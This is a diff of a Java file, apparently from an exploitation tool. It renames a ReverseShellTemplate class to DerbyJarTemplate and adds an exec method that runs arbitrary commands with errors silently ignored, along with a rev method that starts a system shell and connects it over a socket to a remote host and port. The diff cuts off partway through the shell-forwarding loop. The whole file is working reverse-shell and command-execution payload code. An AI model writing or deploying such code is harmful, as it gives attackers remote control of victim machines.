@@ -4,15 +4,18 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class ReverseShellTemplate {
-    public static String host;
-    public static int port;
+public class DerbyJarTemplate {
+    public static void exec(String cmd) {
+        try {
+            Runtime.getRuntime().exec(cmd);
+        } catch (Exception e) { }
+    }
 
-    static {
+    public static void rev(String host, String port) {
         try {
             String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd" : "sh";
             Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
-            Socket s = new Socket(host, port);
+            Socket s = new Socket(host, Integer.parseInt(port));
             InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
             OutputStream po = p.getOutputStream(), so = s.getOutputStream();
             while (!s.isClosed()) {
